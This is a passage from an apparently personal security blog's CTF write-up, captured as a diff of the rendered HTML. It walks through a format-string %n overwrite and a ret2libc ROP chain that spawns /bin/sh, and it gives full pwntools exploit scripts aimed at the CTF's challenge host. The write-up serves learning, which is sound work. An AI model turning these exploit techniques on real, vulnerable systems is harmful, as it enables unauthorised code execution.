+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fflush</span>(stdout);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// todo -&gt; flip this
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (isAllowed)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printFlag</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Which makes it clear our goal is to modify <code>isAllowed</code> to a non-zero value such that the check will pass and leak the flag. As mentioned our format string vulnerability, which is introduced just before the if case <code>printf(buf)</code>, can be exploited with <code>%n</code> to alter the memory at <code>isAllowed</code>.</p>
+<p>Of note is that the binary also leaks the memory address of <code>isAllowed</code> which we can see in the source code just bellow the variable decelerations.</p>
+<p>For format string challenges I use a little utility lib that I made myself, you can find it <a href="https://github.com/Angus-C-git/SecSheets/blob/master/Binary%20Exploitation/FormatStrings/FormatStrings.md#automated-format-sting-payloads">here</a>. Alternatively pwntools has one built in.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># fmt</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> formatstrings.fmt_string <span style="color:#f92672">import</span> build
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ::::::::::::::::::::::::: CONFIG :::::::::::::::::::::::::</span>
+</span></span><span style="display:flex;"><span>PATH <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Chals&#39;</span>
+</span></span><span style="display:flex;"><span>BINARY <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;printf&#39;</span>
+</span></span><span style="display:flex;"><span>HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;ctfo.2pmc.net:10004&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## get da banner</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;Receiving banner ...&#39;</span>)
+</span></span><span style="display:flex;"><span>isAllowed_addr <span style="color:#f92672">=</span> int(proc<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>), <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;isAllowed_addr: </span><span style="color:#e6db74">{</span>hex(isAllowed_addr)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> build(isAllowed_addr, <span style="color:#ae81ff">0x42</span>, <span style="color:#ae81ff">6</span>)
+</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># shellit</span>
+</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><blockquote>
+<p><code>flag{forgot_to_save}</code></p>
+</blockquote>
+<h3 id="baby-rop">baby rop</h3>
+<p>This challenge was a pretty fun <code>ret2libc</code> variant of <a href="https://github.com/Angus-C-git/SecSheets/blob/master/Binary%20Exploitation/ROP/ROP.md#return-oriented-programming-rop">ROP</a> with the libc version used on the host included. In such ROP challenges there are three main goals:</p>
+<ol>
+<li>Calculate the offset for an overflow</li>
+<li>Rebase libc with a leak</li>
+<li>Call system with a reference to <code>/bin/sh</code> using <code>libc</code></li>
+</ol>
+<p>If you haven&rsquo;t seen a ROP challenge before this will be a difficult place to start so do checkout some other resources. However for a quick overview of <code>ret2libc</code> we basically obtain or are given the version and sometimes binary of a dynamically linked standard <code>C</code> library that contains a ton of functions used in writing most <code>C</code> programs. Examples include: <code>printf</code>, <code>puts</code>, <code>strncmp</code> and <code>system</code>. There are also other strings floating around in there that we can take advantage of such as <code>/bin/sh</code> which <code>system</code> needs as an argument in order to obtain a shell for us.</p>
+<p>Thus with this in mind we run the binary and see that it leaks two address values. The first is some random address <code>lol</code> that refers to very little in memory. The second however <code>system plez</code> is the address of the <code>system</code> function in the <strong>binary</strong> (not libc). We can collect this leak for usage in rebasing the binary.</p>
+<p>With that in hand we can use the difference between the leaked system address and the one in <code>libc</code> to calculate the base address of <code>libc</code> using the handy pwntools syntax:</p>
+<p><code>libc.address = system_addr - libc.symbols['system']</code></p>
+<p>This will now allow us to interact with arbitrary <code>libc</code> functions and grab helpful strings using pwntool&rsquo; search method. Thus we proceed marking <code>libc</code> as a input for the <code>ROP</code> method and then exploiting one of the most powerful oneliners in pwntools:</p>
+<p><code>rop.call(libc.symbols['system'], [next(libc.search(b'/bin/sh\x00'))])</code></p>
+<p>Which will construct all the necessary bits and pieces to call <code>system(&quot;/bin/sh&quot;)</code> for us once we take over the return pointer. Thus in similar fashion to other buffer overflow challenges we use the <code>flat()</code> method in combination with <code>rop.chain()</code> to insert our constructed chain at the return. Running this against remote works great and we take home a <code>400 pt</code> flag!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>PATH <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Chals&#39;</span>
+</span></span><span style="display:flex;"><span>BINARY <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;babyrop&#39;</span>
+</span></span><span style="display:flex;"><span>HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;ctfo.2pmc.net:7888&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>LIBC_REMOTE <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>PATH<span style="color:#e6db74">}</span><span style="color:#e6db74">/libc/libc-2.28.so&#39;</span>
+</span></span><span style="display:flex;"><span>LIBC_LOCAL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ::::::::::::::::::::::: CHECK SEC ::::::::::::::::::::::::</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Arch:     amd64-64-little
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    RELRO:    Partial RELRO
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Stack:    No canary found
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    NX:       NX enabled
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    PIE:      No PIE (0x400000)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;amd64&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">pwn</span>(args):
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34; hack the program &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    binary <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;./</span><span style="color:#e6db74">{</span>PATH<span style="color:#e6db74">}</span><span style="color:#e6db74">/</span><span style="color:#e6db74">{</span>BINARY<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>    proc <span style="color:#f92672">=</span> process(binary)
+</span></span><span style="display:flex;"><span>    rop <span style="color:#f92672">=</span> ROP(binary)
+</span></span><span style="display:flex;"><span>    elf <span style="color:#f92672">=</span> ELF(binary, <span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>    libc <span style="color:#f92672">=</span> ELF(LIBC_LOCAL, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (args<span style="color:#f92672">.</span>remote):
+</span></span><span style="display:flex;"><span>        host <span style="color:#f92672">=</span> HOST<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;:&#39;</span>)
+</span></span><span style="display:flex;"><span>        proc <span style="color:#f92672">=</span> remote(host[<span style="color:#ae81ff">0</span>], int(host[<span style="color:#ae81ff">1</span>]))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>: libc <span style="color:#f92672">=</span> ELF(LIBC_REMOTE, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span>: libc <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">## get da banner</span>
+</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;Receiving banner ...&#39;</span>)
+</span></span><span style="display:flex;"><span>    pause()
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># proc.recvuntil(&#39;&gt; &#39;)</span>
+</span></span><span style="display:flex;"><span>    banner <span style="color:#f92672">=</span> proc<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;lol: &#39;</span>)
+</span></span><span style="display:flex;"><span>    lol_addr <span style="color:#f92672">=</span> proc<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;lol was </span><span style="color:#e6db74">{</span>lol_addr<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>    proc<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;system leak plz: &#39;</span>)
+</span></span><span style="display:flex;"><span>    system_addr <span style="color:#f92672">=</span> int(proc<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>), <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;System addr: </span><span style="color:#e6db74">{</span>hex(system_addr)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># offset for overflow</span>
+</span></span><span style="display:flex;"><span>    offset <span style="color:#f92672">=</span> cyclic_find(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;kaaa&#39;</span>)
+</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Offset: </span><span style="color:#e6db74">{</span>offset<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># rebase libc using leak</span>
+</span></span><span style="display:flex;"><span>    libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> system_addr <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;system&#39;</span>]
+</span></span><span style="display:flex;"><span>    rop <span style="color:#f92672">=</span> ROP(libc)
+</span></span><span style="display:flex;"><span>    rop<span style="color:#f92672">.</span>call(libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;system&#39;</span>], [next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># construct payload</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> flat({
+</span></span><span style="display:flex;"><span>        offset: rop<span style="color:#f92672">.</span>chain()
+</span></span><span style="display:flex;"><span>    })
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    proc<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># shellit</span>
+</span></span><span style="display:flex;"><span>    proc<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><blockquote>
+<p><code>flag{s0_y0u_c@n_r0p??}</code></p>
+</blockquote>
+
+            </div>
+        </article>
+
+        <hr />
+
+        
+        <div class="post-info">
+            
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="https://cybernetic.coffee/tags/hacking/">hacking</a></span>
+        <span class="tag"><a href="https://cybernetic.coffee/tags/ctf/">CTF</a></span>
+        <span class="tag"><a href="https://cybernetic.coffee/tags/binary-exploitation/">Binary Exploitation</a></span>
+        <span class="tag"><a href="https://cybernetic.coffee/tags/web-hacking/">Web Hacking</a></span>
+        <span class="tag"><a href="https://cybernetic.coffee/tags/steganography/">Steganography</a></span>
+        
+    </p>
+
+
+
+            <p>
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+                    <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+                    <polyline points="14 2 14 8 20 8"></polyline>
+                    <line x1="16" y1="13" x2="8" y2="13"></line>
+                    <line x1="16" y1="17" x2="8" y2="17"></line>
+                    <polyline points="10 9 9 9 8 9"></polyline>
+                </svg>
+                2220 Words
+            </p>
+  		</div>
+        
+
+
+        
+            
+                <div class="pagination">
+                    <div class="pagination__title">
+                        <span class="pagination__title-h"></span>
+
+                    </div>
+
+                    <div class="pagination__buttons">
+                        
+
+                        
+                            <span class="button next">
+                              <a href="https://cybernetic.coffee/blog/learn-source-code-auditing_2/">
+                                <span class="button__text">Learn Source Code Auditing By Building a Tool #2: POC and Pattern Analysis for Basic Vulnerabilities</span>
+                                <span class="button__icon">→</span>
+                              </a>
+                            </span>
+                        
+                    </div>
+                </div>
+            
+        
+
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    <div class="footer__inner">
+        <div class="footer__content">
+            
+        </div>
+    </div>
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Hacked together with &#10084; by <a href="https://github.com/Angus-C-git">Angus C</a> <i class='fas fa-ghost'></i> </span>
+          </div>
+    </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+
+<script type="text/javascript" src="/bundle.min.755e4cf350f154c0fee20aa6a1b7fa2b35fcbeaaf4cc62ef45531b19ae1fd43e5ed19c3c3bbf522045953eaef03e1cb96a64a636782486a3aa0b0563d0ef5406.js" integrity="sha512-dV5M81DxVMD&#43;4gqmobf6KzX8vqr0zGLvRVMbGa4f1D5e0Zw8O79SIEWVPq7wPhy5amSmNngkhqOqCwVj0O9UBg=="></script>
+
+
+
+    </body>
+</html>
